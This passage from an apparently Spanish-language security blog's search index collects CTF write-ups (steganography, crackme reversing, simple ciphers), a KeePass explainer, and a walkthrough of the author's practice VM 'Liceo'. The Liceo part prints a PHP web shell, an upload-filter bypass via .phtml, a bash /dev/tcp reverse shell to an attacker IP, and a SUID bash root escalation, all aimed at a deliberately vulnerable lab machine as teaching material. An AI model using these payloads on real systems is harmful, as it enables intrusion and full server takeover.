
[{"content":"","date":"16 June 2024","externalUrl":null,"permalink":"/retos/caixabank-tech/","section":"Retos","summary":"","title":"CaixaBank Tech","type":"retos"},{"content":" WRITEUP CTF CaixaBank Tech - RETO 1 # Competición CaixaBank Tech | Reto Esteganografía [1/2] TESIS DEL DESAFÍO # Iniciamos el reto viendo la siguiente imagen. En ella, se puede observar que en la boca falta una pieza. Se utilizaron varias herramientas para examinar los metadatos de la imagen y verificar si contenía algún archivo en su interior, pero no se obtuvieron resultados. Tras varias horas realizando otros retos de la competición, llegué a la conclusión de que la pieza que falta podría ser la contraseña para acceder a los archivos en el interior de la imagen principal. Así que busqué información acerca de la pieza que faltaba y era la número 35.\nSe utilizó la herramienta online Steganographic Decoder:\nhttps://futureboy.us/stegano/decinput.html Si pulsamos el botón \u0026ldquo;Submit\u0026rdquo;, nos dará un resultado que, como podemos ver, tiene formato de flag encriptado.\nUna vez obtenida la flag encriptada, deberemos desencriptarla para que esté correctamente y se pueda entregar para obtener la puntuación en la competición. Para ello, utilizaremos una herramienta online de la página \u0026ldquo;dCode\u0026rdquo;.\nhttps://www.dcode.fr/rot-cipher Una vez en la página, pondremos la flag codificada en el recuadro, pulsaremos el botón \u0026ldquo;Decrypt\u0026rdquo; y obtendremos el resultado en la parte izquierda de la pantalla.\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/caixabank-tech/reto-1/","section":"Retos","summary":"WRITEUP CTF CaixaBank Tech - RETO 1 # Competición CaixaBank Tech | Reto Esteganografía [1/2] TESIS DEL DESAFÍO # Iniciamos el reto viendo la siguiente imagen.","title":"CaixaBank Tech - Reto 1","type":"retos"},{"content":" WRITEUP CTF CaixaBank Tech - RETO 7 # Competición CaixaBank Tech | Reto Reverse Engineering [1/2] Ejecución del binario # Al descargar el desafío, nos proporcionan un binario llamado \u0026ldquo;crackme\u0026rdquo;. Le damos permisos de ejecución utilizando el siguiente comando.\nchmod +x crackme Una vez hemos otorgado los permisos, ejecutamos el binario para ver qué contiene en su interior:\nComo vemos, al ejecutarlo nos pide que introduzcamos una contraseña para poder ejecutarlo correctamente.\nVisualización de cadenas legibles # Vamos a utilizar la utilidad strings antes que nada para ver si podemos encontrar alguna cadena que nos llame la atención:\nComo observamos, hay algunas cadenas de texto interesantes, entre ellas las siguientes:\nWelcome to the bank platform! Enter your the secret key: Congratulations! You now have access to the plaftorm! Wrong key. I hope you are not a bank thief! ABCDEFGH IJKLMNOP QRSTUVWX YZabcdef ghijklmn opqrstuv wxyz0123 456789+/ PDY7PSEx aSMFLGko GkoIwUpa TkoaS4n xor_encrypt base64_encrypt Uso de ltrace # Ahora vamos a utilizar la herramienta ltrace para poder ver más a fondo el programa y su funcionamiento interno:\nAquí podemos ver que cuando ponemos la contraseña \u0026ldquo;prueba\u0026rdquo;, el programa obtiene su longitud y también la convierte en hexadecimal:\nstrlen(\u0026#34;prueba\u0026#34;) = 6 strdup(\u0026#34;prueba\u0026#34;) = 0x5b0d828fcb40 Luego lo pasa a una cadena de texto y la compara con otra:\nstrcpy(0x5b0d828fcb40, \u0026#34;KigvPzg7\u0026#34;) = 0x5b0d828fcb40 strcmp(\u0026#34;KigvPzg7\u0026#34;, \u0026#34;PDY7PSExaSMFLGkoIwUpaTkoaS4n\u0026#34;) Analizando el binario con Ghidra # Habiendo visto esto, vamos a usar la herramienta Ghidra para ver el binario por dentro:\nAbrimos la función \u0026ldquo;main\u0026rdquo;: Solicita una clave secreta al usuario. Verifica la clave utilizando una función externa (verify_key). Informa al usuario si la clave es correcta o incorrecta. Vemos que nos pregunta la clave y la almacena en local_10, también vemos que llama a otra función verify_key , vamos a ver la función verify_key para ver como identifica y si es válida o no:\nLa función verify_key realiza los siguientes pasos:\nInicializa una serie de variables con valores específicos en hexadecimal. Duplica la clave proporcionada. Cifra la clave duplicada llamdo a otras funciones (xor_encrypt, base64_encrypt) Compara la clave cifrada con un valor interno predefinido. Retorna true si la clave cifrada coincide con el valor predefinido, y false en caso contrario. Esto es muy interesante ya que el valor con el que lo compara lo hemos podido ver antes con ltrace:\nPDY7PSExaSMFLGkoIwUpaTkoaS4n\nSolo nos queda decodificar esta cadena de la forma en la que codifica la clave que nosotros proporcionamos, para esto vamos a ver las funciones xor_encrypt y base64_encrypt:\nLa función base64_encrypt simplemente encodea en base64\nLa función xor_encrypt:\nAplica la operación XOR entre el byte actual y el valor 0x5a\nCreación del script para decodificar la cadena # Ahora que ya hemos visto como funciona la codificación vamos a hacer un script aplicando esto pero al reves para decodificarlo:\nimport base64 # Las cadenas codificadas en base64 que se comparan con la entrada del usuario encoded_strs = [\u0026#34;PDY7PSExaSMFLGkoIwUpaTkoaS4n\u0026#34;] # La clave original key = \u0026#34;\u0026#34; # Para cada cadena codificada en base64 for encoded_str in encoded_strs: # Decodificar la cadena de base64 decoded_str = base64.b64decode(encoded_str).decode(\u0026#39;utf-8\u0026#39;, \u0026#39;ignore\u0026#39;) # Realizar la operación XOR para obtener la parte de la clave original for i in range(len(decoded_str)): # Convertir cada carácter a su valor ASCII ascii_val = ord(decoded_str[i]) # Realizar la operación XOR con 0x5a xor_val = ascii_val ^ 0x5a # Convertir el valor resultante de nuevo a un carácter char = chr(xor_val) # Comprobar si el carácter es imprimible if char.isprintable(): # Añadir el carácter a la clave key += char print(\u0026#34;La flag es: \u0026#34; + key) Ejecutamos el script: Verificamos que sea esta: Ya tenemos la Flag!\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/caixabank-tech/reto-7/","section":"Retos","summary":"WRITEUP CTF CaixaBank Tech - RETO 7 # Competición CaixaBank Tech | Reto Reverse Engineering [1/2] Ejecución del binario # Al descargar el desafío, nos proporcionan un binario llamado \u0026ldquo;crackme\u0026rdquo;.","title":"CaixaBank Tech - Reto 7","type":"retos"},{"content":"","date":"16 June 2024","externalUrl":null,"permalink":"/","section":"iHarzz","summary":"","title":"iHarzz","type":"page"},{"content":"","date":"16 June 2024","externalUrl":null,"permalink":"/retos/picoctf/","section":"Retos","summary":"","title":"PicoCTF","type":"retos"},{"content":"CaixaBank Tech ha sido una sección creada exclusivamente para subir los retos de una competición híbrida que se realizó en Barcelona. El evento se trataba del Barcelona Cybersecurity Congress y, dentro del mismo, había un stand de la compañía CaixaBank que ofrecía una competición en formato CTF (Capture The Flag). Participé en esta competición con mi equipo, STD.Group, que incluía a mis compañeros Fouen, D3b0o, Ikerslee.\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/caixabank-tech/presentaci%C3%B3n/","section":"Retos","summary":"CaixaBank Tech ha sido una sección creada exclusivamente para subir los retos de una competición híbrida que se realizó en Barcelona.","title":"Presentación CaixaBank Tech","type":"retos"},{"content":"Aquí encontrarás contenido relacionado sobre noticias, herramientas, contenido, etc… acerca de la cibseguridad. Aprenderás técnicas para desarrollar tus habilidades en Capture The Flag.\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/","section":"Retos","summary":"Aquí encontrarás contenido relacionado sobre noticias, herramientas, contenido, etc… acerca de la cibseguridad.","title":"Retos","type":"retos"},{"content":" WRITEUP RETO [MIND YOUR Ps AND Qs] Cryptography # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.\nComo vemos en la imagen, se trata de un RSA completo, listo para poder descifrarse. Vamos a utilizar una herramienta en línea para decodificar el RSA y obtener la flag. La herramienta utilizada para este caso será \u0026ldquo;dCode\u0026rdquo;.\nhttps://www.dcode.fr/rsa-cipher VALORES RSA C = 861270243527190895777142537838333832920579264010533029282104230006461420086153423 N = 1311097532562595991877980619849724606784164430105441327897358800116889057763413423 E = 65537 Una vez rellenados los valores correspondientes, el resultado se mostrará en la parte izquierda de la pantalla. En este caso, el descifrado es satisfactorio ya que nos otorga la flag.\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/picoctf/mindyourpsandqs/","section":"Retos","summary":"WRITEUP RETO [MIND YOUR Ps AND Qs] Cryptography # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.","title":"Writeup - Mind your Ps and Qs","type":"retos"},{"content":" WRITEUP RETO [MOD 26] CRIPTOGRAFÍA # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.\ncvpbPGS{arkg_gvzr_V\u0026rsquo;yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}\nEste reto es bastante sencillo; debemos fijarnos en la descripción del ejercicio, donde ya se indica qué tipo de cifrado se ha utilizado para codificar la flag. En este caso, el cifrado es ROT13.\nConsiste en una técnica de cifrado por sustitución que consiste en desplazar cada letra del alfabeto 13 posiciones hacia adelante. Por ejemplo, \u0026ldquo;A\u0026rdquo; se convierte en \u0026ldquo;N\u0026rdquo;, \u0026ldquo;B\u0026rdquo; en \u0026ldquo;O\u0026rdquo; y así sucesivamente. Es utilizado comúnmente para ocultar texto de manera simple, pero no proporciona una seguridad real.\n¿QUÉ ÉS ROT13? # ROT13 consiste en una técnica de cifrado por sustitución que consiste en desplazar cada letra del alfabeto 13 posiciones hacia adelante. Por ejemplo, \u0026ldquo;A\u0026rdquo; se convierte en \u0026ldquo;N\u0026rdquo;, \u0026ldquo;B\u0026rdquo; en \u0026ldquo;O\u0026rdquo; y así sucesivamente. Es utilizado comúnmente para ocultar texto de manera simple, pero no proporciona una seguridad real .\n¿QUÉ HERRAMIENTA SE PUEDE USAR PARA DECODIFICAR ROT13? # Para decodificar este cifrado, puedes utilizar una herramienta que está disponible en internet.\n\u0026ndash;\u0026gt; CyberChef https://gchq.github.io/CyberChef/.\nEn la interfaz podemos observar 3 módulos. # --\u0026gt; Operation {Izquierda} --\u0026gt; Recipe {Centro} --\u0026gt; Input - Output {Derecha} FUNCIONAMIENTO CYBERCHEF # SECCIÓN OPERATIONS # En esta sección, buscaremos nuestro cifrado, que en este caso es \u0026ldquo;ROT13\u0026rdquo;. Puedes arrastrarlo al apartado Recipe o seleccionarlo haciendo doble clic izquierdo sobre el cifrado, lo que aplicará automáticamente el cifrado en el apartado Recipe.\nSECCIÓN RECIPE # Esta es una de las secciones más simples, ya que su único propósito es mostrar los cifrados que hemos asignado y permitir la activación o desactivación de sus funciones.\nSECCIÓN INPUT # La sección \u0026ldquo;Input\u0026rdquo; es donde aplicaremos el contenido que deseamos descifrar.\nSECCIÓN OUTPUT # Output es la sección donde obtendremos el resultado decodificado.\nRESULTADO # ","date":"16 June 2024","externalUrl":null,"permalink":"/retos/picoctf/challenge13/","section":"Retos","summary":"WRITEUP RETO [MOD 26] CRIPTOGRAFÍA # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.","title":"Writeup - Mod 26","type":"retos"},{"content":" WRITEUP RETO [THE NUMBERS] Cryptography # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.\nPara empezar este reto, será necesario descargar la imagen que se encuentra al iniciar el propio reto. Como podemos observar, hay una serie de números, y parte de la misma cadena está encerrada entre corchetes.\nSERIE NUMÉRICA: 16 9 3 15 3 20 6 {20 8 5 14 21 13 2 5 18 19 13 1 19 15 14} Debido a la secuencia, podríamos encontrarnos ante una decodificación por sustitución. Para resolver el reto, utilizaremos una herramienta web llamada \u0026ldquo;dCode\u0026rdquo; en su apartado de sustitución.\nhttps://www.dcode.fr/letter-number-cipher Una vez en la herramienta, la configuraremos con los números.\nUna vez ingresado el texto, pulsaremos el botón \u0026ldquo;Decrypt\u0026rdquo; y observaremos el resultado en la parte izquierda de la pantalla.\n","date":"16 June 2024","externalUrl":null,"permalink":"/retos/picoctf/thenumbers/","section":"Retos","summary":"WRITEUP RETO [THE NUMBERS] Cryptography # ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A REALIZAR TÚ EL RETO.","title":"Writeup - The Numbers","type":"retos"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"Aquí encontrarás contenido relacionado sobre noticias, herramientas, contenido, etc… acerca de la ciberseguridad.\n","date":"1 January 0001","externalUrl":null,"permalink":"/blog/","section":"Blog","summary":"Aquí encontrarás contenido relacionado sobre noticias, herramientas, contenido, etc… acerca de la ciberseguridad.","title":"Blog","type":"blog"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/retos/dockerlabs/","section":"Retos","summary":"","title":"Dockerlabs","type":"retos"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/retos/hackthebox/","section":"Retos","summary":"","title":"Hack The Box","type":"retos"},{"content":" ¿Qué es Keepass? # KeePass es un software de código abierto que ayuda a las personas a gestionar y almacenar de forma segura contraseñas y otros datos confidenciales en una base de datos cifrada. Requiere una contraseña maestra para acceder a las contraseñas y ofrece características como generación de contraseñas, organización, integración con navegadores y portabilidad en diferentes sistemas operativos. Es una herramienta útil para mantener contraseñas seguras y organizadas.\n¿Cuánto de seguro es Keepass? # KeePass es considerado un administrador de contraseñas seguro debido a su cifrado fuerte y otras características de seguridad. Su seguridad depende de una contraseña maestra sólida y buenas prácticas por parte del usuario. El proyecto es de código abierto y se actualiza regularmente para abordar vulnerabilidades potenciales. En resumen, KeePass es seguro, pero la seguridad se basa en el usuario y su configuración.\n¿Cómo funciona Keepass? # KeePass funciona al cifrar y almacenar contraseñas y otros datos confidenciales en una base de datos segura. Requiere una contraseña maestra para acceder a esta información. El usuario puede organizar contraseñas, generar contraseñas fuertes y acceder a ellas de manera segura. KeePass está diseñado para proteger los datos del usuario con cifrado sólido y medidas de seguridad, asegurando que solo el usuario autorizado pueda acceder a la información almacenada.\n¿Dónde se aloja la base de datos de Keepass? # La base de datos de KeePass se almacena en un archivo local en tu dispositivo o en el lugar que determines. KeePass te permite elegir la ubicación y el nombre del archivo de la base de datos, lo que te brinda control sobre dónde se almacenan tus contraseñas y datos confidenciales. Puedes guardar este archivo en tu disco duro, unidad USB, en la nube o en cualquier otro lugar de tu elección. Es importante asegurarse de que esta base de datos esté almacenada en un lugar seguro y accesible solo para ti, ya que contiene información sensible.\nPros y Contras de tener la base de datos en local: # PROS CONTRAS Control total Falta de sincronización Mayor privacidad Riesgo de pérdida de datos Acceso sin conexión Riesgo de seguridad local Instalación de KeePass # Visita el sitio web oficial de KeePass y descarga la versión compatible con tu sistema operativo. En Windows, ejecuta el archivo de instalación y sigue las instrucciones. En macOS, copia la aplicación en la carpeta de aplicaciones. En Linux, usa el administrador de paquetes de tu distribución. Una vez instalado, configura una contraseña maestra fuerte y comienza a gestionar tus contraseñas. Asegúrate de descargar desde fuentes confiables y haz copias de seguridad de tus datos. Una vez instalado, podrás ejecutar KeePass y comenzar a configurar tu base de datos de contraseñas. Debes establecer una contraseña maestra fuerte que se utilizará para proteger tus contraseñas almacenadas.Es importante descargar KeePass desde fuentes oficiales o confiables para garantizar la seguridad de la instalación. Además, considera crear copias de seguridad de tu base de datos de contraseñas y de la contraseña maestra para evitar la pérdida de datos.\n","date":"1 January 0001","externalUrl":null,"permalink":"/blog/kepass/","section":"Blog","summary":"¿Qué es Keepass?","title":"KeePass | ¡Mantén tus contraseñas lo más seguras posibles!","type":"blog"},{"content":" LICEO # Liceo es una máquina creada para todas aquellas personas que desean iniciarse en la ciberseguridad, especialmente en el mundo del pentesting.\nLa máquina consta de varias partes que requieren habilidades específicas para completar su explotación. El objetivo principal es incentivar y dar visibilidad al pentesting mediante este reto. En el pentesting de explotación de sistemas, podemos encontrar diversas dificultades para comprenderlo, pero después de una larga trayectoria en este sector, he decidido crear Liceo para ofrecer un ejemplo de explotación de sistemas sencillo.\n¿DÓNDE SE PUEDE DESCARGAR LA MÁQUINA? # La máquina se encuentra disponible para descargar en la web de HackMyVm.\nWRITEUP LICEO # Requisitos # Sistema Operativo Kali Linux o similar. Máquinas en la misma Red. Enumeración # El primer paso para poder comenzar una máquina es realizar la enumeración de los servicios que la máquina víctima está corriendo para ello, primero de todo deberemos de saber la IP de la máquina víctima.\nIP MÁQUINA VÍCTIMA (TARGET)\n10.0.2.4 Una vez tenemos la dirección IP de la máquina víctima, podemos empezar con la enumeración de servicios. Utilizando el comando Nmap con sus respectivos parámetros, vamos a poder identificar los servicios y versiones que se están ejecutando en los puertos.\n❯ sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.0.2.4 -oG allPorts\rHost discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 17:06 EST\rNSE: Loaded 156 scripts for scanning.\rNSE: Script Pre-scanning.\rNSE: Starting runlevel 1 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rNSE: Starting runlevel 2 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rNSE: Starting runlevel 3 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.01s elapsed\rInitiating ARP Ping Scan at 17:06\rScanning 10.0.2.4 [1 port]\rCompleted ARP Ping Scan at 17:06, 0.08s elapsed (1 total hosts)\rInitiating SYN Stealth Scan at 17:06\rScanning 10.0.2.4 [65535 ports]\rDiscovered open port 80/tcp on 10.0.2.4\rDiscovered open port 22/tcp on 10.0.2.4\rDiscovered open port 21/tcp on 10.0.2.4\rCompleted SYN Stealth Scan at 17:06, 3.25s elapsed (65535 total ports)\rInitiating Service scan at 17:06\rScanning 3 services on 10.0.2.4\rCompleted Service scan at 17:06, 6.07s elapsed (3 services on 1 host)\rNSE: Script scanning 10.0.2.4.\rNSE: Starting runlevel 1 (of 3) scan.\rInitiating NSE at 17:06\rNSE: [ftp-bounce 10.0.2.4:21] PORT response: 500 Illegal PORT command.\rCompleted NSE at 17:06, 0.43s elapsed\rNSE: Starting runlevel 2 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.05s elapsed\rNSE: Starting runlevel 3 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rNmap scan report for 10.0.2.4\rHost is up, received arp-response (0.00047s latency).\rScanned at 2024-02-11 17:06:38 EST for 10s\rNot shown: 65532 closed tcp ports (reset)\rPORT STATE SERVICE REASON VERSION\r21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.5\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_-rw-rw-r-- 1 1000 1000 191 Feb 01 14:29 note.txt\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:10.0.2.5\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 4\r| vsFTPd 3.0.5 - secure, fast, stable\r|_End of status\r22/tcp open ssh syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)\r| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwZ1vknI6B5ldjpFrlrBx3wmdRq0g9D2vHkGSZF0mqDslvgXA+SYmiBN3ETYhTH8Hh1tVKjGtZADp40fHMfQ1I=\r| 256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)\r|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDWFL2zQHLdSxoHaT8QP6jL3ok4bNN0uWWAMCwK7a5Nx\r80/tcp open http syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))\r|_http-title: Liceo\r|_http-server-header: Apache/2.4.52 (Ubuntu)\r| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET\rMAC Address: 08:00:27:B5:5F:EC (Oracle VirtualBox virtual NIC)\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rNSE: Script Post-scanning.\rNSE: Starting runlevel 1 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rNSE: Starting runlevel 2 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rNSE: Starting runlevel 3 (of 3) scan.\rInitiating NSE at 17:06\rCompleted NSE at 17:06, 0.00s elapsed\rRead data files from: /usr/bin/../share/nmap\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 10.56 seconds\rRaw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) PUERTOS SERVICIO 21 FTP 22 SSH 80 HTTP Intrusión # Una vez que ejecutamos Nmap, la primera información del primer puerto es el 21 (FTP), que nos indica que se permite el acceso con el usuario anónimo (Anonymous).\n❯ ftp 10.0.2.4\rConnected to 10.0.2.4.\r220 (vsFTPd 3.0.5)\rName (10.0.2.4:kali): Anonymous 331 Please specify the password.\rPassword: 230 Login successful.\rRemote system type is UNIX.\rUsing binary mode to transfer files.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||34522|)\r150 Here comes the directory listing.\r-rw-rw-r-- 1 1000 1000 191 Feb 01 14:29 note.txt\r226 Directory send OK.\rftp\u0026gt; Una vez dentro, al ejecutar el comando \u0026rsquo;ls\u0026rsquo;, nos damos cuenta de que hay un archivo de texto llamado \u0026rsquo;note.txt\u0026rsquo;. Para obtener el contenido del archivo, vamos a usar el comando \u0026lsquo;more\u0026rsquo;.\nftp\u0026gt; more note.txt\rHi Matias, I have left on the web the continuations of today\u0026#39;s work, would you mind contiuing in your turn and make sure that the web will be secure? Above all, we dont\u0026#39;t want intruders...\r(END) Gracias a esta nota podemos saber que hay algún tipo de vulnerabilidad en la web, la cual nos podría ayudar a obtener acceso al interior del sistema de la empresa. Una vez hemos terminado de leer la nota, vamos a visitar el sitio web de la compañía.\nDespués de terminar de observar la web y comprobar que no hay ninguna pista sobre la posible vulnerabilidad de la página web, vamos a proceder a realizar fuzzing en la página web.\n❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.4/ -x php,html,txt -t 100\r===============================================================\r===============================================================\r[+] Url: http://10.0.2.4/\r[+] Method: GET\r[+] Threads: 100\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/uploads (Status: 301) [Size: 306] [--\u0026gt; http://10.0.2.4/uploads/]\r/upload.php (Status: 200) [Size: 371]\r/css (Status: 301) [Size: 302] [--\u0026gt; http://10.0.2.4/css/]\r/js (Status: 301) [Size: 301] [--\u0026gt; http://10.0.2.4/js/]\r/images (Status: 301) [Size: 305] [--\u0026gt; http://10.0.2.4/images/]\r/index.html (Status: 200) [Size: 21487]\r/.html (Status: 403) [Size: 273]\r/.php (Status: 403) [Size: 273]\r===============================================================\rFinished\r=============================================================== Explotación vulnerabilidad AFU - RCE (Arbitrary File Upload \u0026amp; Remote Code Execution)\nComo observamos en el escaneo, vemos dos directorios sospechosos: en este caso, \u0026lsquo;upload.php\u0026rsquo; y \u0026lsquo;uploads\u0026rsquo;.\nDespués de visualizar el interior del directorio, observamos de que tenemos la posibilidad de subir archivos dentro de la web de la companía, por lo cual, vamos a intentar de introducir un archivo malicioso con extensión php.\nCREACIÓN Y CARGA DE ARCHIVO MALICIOSO\n❯ cat vuln.php\r1 │ \u0026lt;?php 2 │ system($_GET[\u0026#39;cmd\u0026#39;])\r3 │ ?\u0026gt; Gracias a este archivo, vamos a poder obtener ejecución de comandos dentro del sistema una vez lo subamos y lo ejecutemos para ello, vamos aprobar de subir el archivo.\nCuando intentamos subir el archivo, nos salta un error indicando que no se pueden subir archivos con la extensión .php. Sin embargo, es posible que la validación se esté aplicando únicamente a la extensión .php, aunque los archivos PHP pueden tener otras extensiones como .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp o .module.\nPara cambiar la extensión vamos a usar el comando \u0026lsquo;mv\u0026rsquo; para renombrar la extensión.\n❯ mv vuln.php vuln.phtml Una vez que cambiamos la extensión y la volvemos a subir, veremos que el archivo se carga exitosamente.\nPara verificar que el archivo se encuentra dentro vamos a ubicarnos en el otro directorio encontrado en el fuzzing llamado \u0026lsquo;uploads\u0026rsquo;\nEn este apartado, veremos que los archivos se suben satisfactoriamente, así que vamos a ejecutarlo pulsando sobre el archivo.\nComo se puede observar, no se muestra nada al ejecutar el archivo. Sin embargo, si realizamos una petición a la URL utilizando el código del archivo PHP, podremos comprobar si hay ejecución de comandos para una posible Reverse Shell.\nDespués de probar la petición en la URL, observamos que tenemos ejecución de comandos, por lo cual hay que probar que una Reverse Shell nos de acceso al sistema mediante una shell.\nCREACIÓN REVERSE SHELL\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP ATACANTE\u0026gt;/\u0026#34;PUERTO EN ESCUCHA\u0026#34; 0\u0026gt;\u0026amp;1\u0026#34; Esta es la Reverse Shell que vamos a utilizar para obtener acceso al sistema. Para que la Reverse Shell funcione en una URL, hay que codificarla para que la web pueda interpretarla correctamente, ya que de otro modo podría no ejecutarse correctamente debido a los espacios en el comando.\nbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F443%200%3E%261%22 Una vez hemos codificado la URL, vamos a proceder a ponernos en escucha mediante la terminal utilizando el siguiente comando:\n❯ nc -nlvp 443\rlistening on [any] 443 ... Cuando nos encontremos en escucha, ya podremos ejecutar la shell de la misma manera que hemos efectuado el comando \u0026lsquo;id\u0026rsquo;.\n❯ nc -nlvp 443\rlistening on [any] 443 ...\rconnect to [10.0.2.5] from (UNKNOWN) [10.0.2.4] 51512\rbash: cannot set terminal process group (724): Inappropriate ioctl for device\rbash: no job control in this shell\rbash-5.1$ Si hemos seguido correctamente los pasos, ya tendremos nuestra shell con el usuario \u0026lsquo;www-data\u0026rsquo; dentro del sistema de la compañía.\nESCALADA DE PRIVILEGIOS # TRATADO DE TERMINAL\nCuando ingresamos a una máquina mediante la Reverse Shell, es importante configurar adecuadamente la terminal para poder utilizar la shell de forma normal y evitar posibles fallos. Para lograrlo, utilizaremos diversos comandos que mejorarán su seguridad.\nscript /dev/null -c bash\rctrl z\rstty raw -echo; fg\rreset\rxterm\rexport TERM=xterm SHELL=bash EXPLOTACIÓN DE PERMISOS SUID\nEn esta máquina, nos encontramos una explotación de servicios SUID, para poder explotarlo y convertirnos en el usuario root, será necesario conocer cual es el permiso con el que tendremos acceso realizar el salto.\nwww-data@liceoserver:/$ find / -perm -4000 2\u0026gt;/dev/null\r/snap/snapd/20671/usr/lib/snapd/snap-confine\r/snap/snapd/19457/usr/lib/snapd/snap-confine\r/snap/core20/2105/usr/bin/chfn\r/snap/core20/2105/usr/bin/chsh\r/snap/core20/2105/usr/bin/gpasswd\r/snap/core20/2105/usr/bin/mount\r/snap/core20/2105/usr/bin/newgrp\r/snap/core20/2105/usr/bin/passwd\r/snap/core20/2105/usr/bin/su\r/snap/core20/2105/usr/bin/sudo\r/snap/core20/2105/usr/bin/umount\r/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r/snap/core20/2105/usr/lib/openssh/ssh-keysign\r/snap/core20/1974/usr/bin/chfn\r/snap/core20/1974/usr/bin/chsh\r/snap/core20/1974/usr/bin/gpasswd\r/snap/core20/1974/usr/bin/mount\r/snap/core20/1974/usr/bin/newgrp\r/snap/core20/1974/usr/bin/passwd\r/snap/core20/1974/usr/bin/su\r/snap/core20/1974/usr/bin/sudo\r/snap/core20/1974/usr/bin/umount\r/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r/snap/core20/1974/usr/lib/openssh/ssh-keysign\r/usr/lib/snapd/snap-confine\r/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r/usr/lib/openssh/ssh-keysign\r/usr/bin/passwd\r/usr/bin/pkexec\r/usr/bin/newgrp\r/usr/bin/gpasswd\r/usr/bin/su\r/usr/bin/chsh\r/usr/bin/chfn\r/usr/bin/mount\r/usr/bin/umount\r/usr/bin/sudo\r/usr/bin/bash\r/usr/bin/fusermount3\r/usr/libexec/polkit-agent-helper-1 En este caso, el permiso SUID que está expuesto es el bash, para su misma explotación será necesaria la ejecución del permiso.\nwww-data@liceoserver:/# /bin/bash -p\rbash-5.1# whoami\rroot\rbash-5.1# ","date":"1 January 0001","externalUrl":null,"permalink":"/proyectos/liceo/","section":"Proyectos","summary":"LICEO # Liceo es una máquina creada para todas aquellas personas que desean iniciarse en la ciberseguridad, especialmente en el mundo del pentesting.","title":"Liceo","type":"proyectos"},{"content":"En esta sección, donde podrás explorar una variedad de contenidos creados por mí. Aquí encontrarás una colección de mis proyectos, pruebas, y scripts en diversos lenguajes de programación.\n","date":"1 January 0001","externalUrl":null,"permalink":"/proyectos/","section":"Proyectos","summary":"En esta sección, donde podrás explorar una variedad de contenidos creados por mí.","title":"Proyectos","type":"proyectos"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" ANTES DE VER EL WRITEUP ES RECOMENDABLE QUE PRUEBES A 